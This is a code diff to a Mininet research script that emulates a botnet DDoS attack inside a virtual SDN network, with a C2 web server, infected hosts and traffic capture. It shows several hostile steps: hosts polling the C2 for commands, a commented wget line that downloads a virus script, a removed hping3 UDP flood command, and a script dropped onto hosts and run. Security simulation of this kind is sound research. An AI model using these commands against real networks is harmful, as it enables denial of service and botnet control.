@@ -51,19 +51,23 @@ def create_network():
     net.start()
 
     # Run a simple webserver on h5 (attacker node (C2 Server))
+    print("[+] Setting up the C2 server...")
     h6.cmd("echo 'ls' > command")
     h6.cmd("python3 -m http.server 80 &> /tmp/server.log &")
 
-    print("[+] Waiting for the C2 server to be ready...")
+    print("    [+] Waiting for the C2 server to be ready...")
     time.sleep(2)
 
     out = h2.cmd("curl http://10.42.0.6/command")
     if "ls" not in out:
-        print("[+] Failed to setup the C2 server. Please check the network configuration.")
+        print("    [+] Failed to setup the C2 server.")
         print(h6.cmd("cat /tmp/server.log"))
         return
 
+    print("    [+] C2 server is ready.")
+
     # Simulate Infection
+    print("[+] Simulating infection...")
     for host in [h2, h4, h5]:
         # host.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
         virus = """import time
@@ -83,7 +87,6 @@ while True:
         """
         host.cmd(f"echo \"{virus}\" > virus.py")
         host.cmd('python3 virus.py &> output.txt &')
-        #host.cmd('sudo hping3 --flood --udp 10.42.0.1 &')
 
     # Start Monitoring
     print("[+] Starting monitoring...")
@@ -98,6 +101,7 @@ while True:
             Popen(f"tcpdump -i s{i}-eth{j} -w /tmp/s{i}-eth{j}.pcap &", shell=True).wait()
 
     time.sleep(1)
+    print()
 
     net.pingAll()
 
@@ -112,10 +116,10 @@ while True:
     print(f"    [+] Running: {cmd}")
     h5.cmd(f"echo \"{cmd}\" > command")
 
-    print("[+] Waiting for the attack to take effect...")
+    print("    [+] Waiting for the attack to take effect...")
     time.sleep(10)
 
-    print("[+] Press Ctrl+C once to stop the attack...")
+    print("    [+] Press Ctrl+C once to stop the attack...")
     try:
         while True:
             net.ping([h3, h1])
@@ -125,7 +129,7 @@ while True:
 
     time.sleep(1)
 
-    print("[+] Stopping the attack...")
+    print("    [+] Stopping the attack...")
 
     for host in [h2, h4, h5]:
         host.cmd('killall python')
@@ -151,10 +155,15 @@ while True:
 
     # Stop the network
     print("[+] Stopping the network...")
-    net.stop()
+    try:
+        net.stop()
+    except Exception:
+        print("    [-] Failed to stop the network.")
 
     print("[+] Tarring the results...")
     Popen("tar -czvf /tmp/results.tar.gz /tmp/mon.csv /tmp/s*.pcap /tmp/*.txt", shell=True).wait()
+
+    print("[+] Done.")
 
 if __name__ == '__main__':
     setLogLevel('info')
